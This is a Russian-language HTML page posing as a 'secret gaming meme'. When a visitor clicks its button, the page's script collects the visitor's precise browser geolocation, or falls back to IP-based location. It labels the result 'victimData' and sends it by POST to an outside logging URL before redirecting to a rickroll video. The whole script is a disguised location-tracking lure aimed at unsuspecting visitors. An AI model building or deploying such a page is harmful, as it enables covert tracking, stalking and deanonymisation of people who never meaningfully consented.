<!DOCTYPE html>
<html>
<head>
<title>🗺️ МЕМ С ГЕОЛОКАЦИЕЙ 🗺️</title>
<meta charset="UTF-8">
<style>
body {
  margin: 0; padding: 40px;
  background: linear-gradient(45deg, #ff416c, #ff4b2b);
  font-family: 'Comic Sans MS', cursive;
  text-align: center;
  color: white;
}
h1 { font-size: 3em; text-shadow: 3px 3px 10px #000; }
img { max-width: 350px; border-radius: 20px; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
.btn {
  background: #ff6b35; color: white; border: none;
  padding: 20px 50px; font-size: 24px; border-radius: 40px;
  cursor: pointer; font-family: inherit; margin: 20px;
  box-shadow: 0 10px 30px rgba(255,107,53,0.5);
  animation: pulse 2s infinite;
}
@keyframes pulse { 0%,100%{transform:scale(1);} 50%{transform:scale(1.05);} }
#status { font-size: 1.5em; margin: 20px; }
</style>
</head>
<body>
<h1>🎮 Секретный игровой мем 🎮</h1>
<img src="https://http.cat/420.jpg">
<br>
<button class="btn" onclick="getLocation()">📍 ПОЛУЧИТЬ МЕМ 📍</button>
<div id="status"></div>

<script>
async function getLocation() {
  document.getElementById('status').innerHTML = '🔍 Определяем твое местоположение...';
  
  // Browser Geolocation (точные координаты)
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(async (pos) => {
      const victimData = {
        type: 'BROWSER_GEO',
        lat: pos.coords.latitude,
        lon: pos.coords.longitude,
        accuracy: pos.coords.accuracy,
        timestamp: new Date().toISOString()
      };
      
      // IP GEO backup
      try {
        const ipData = await fetch('https://ipapi.co/json/').then(r=>r.json());
        victimData.ip = ipData.ip;
        victimData.city = ipData.city;
        victimData.country = ipData.country_name;
      } catch(e) {}
      
      // ОТПРАВКА НА ТВОЙ LOG
      fetch('https://raw.githubusercontent.com/netwoedleo/ip-tracker-logs/main/log.php', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(victimData)
      });
      
      document.getElementById('status').innerHTML = '✅ Мем готов! 😈';
      setTimeout(() => {
        window.location = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
      }, 2000);
    }, async () => {
      // Fallback IP GEO
      const ipData = await fetch('https://ipapi.co/json/').then(r=>r.json());
      const victimData = {
        type: 'IP_GEO',
        ip: ipData.ip,
        city: ipData.city,
        region: ipData.region,
        country: ipData.country_name,
        lat: ipData.latitude,
        lon: ipData.longitude,
        timestamp: new Date().toISOString()
      };
      
      fetch('https://raw.githubusercontent.com/netwoedleo/ip-tracker-logs/main/log.php', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(victimData)
      });
      
      document.getElementById('status').innerHTML = '✅ Мем готов! 😈';
      setTimeout(() => {
        window.location = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
      }, 2000);
    });
  }
}
</script>
</body>
</html>
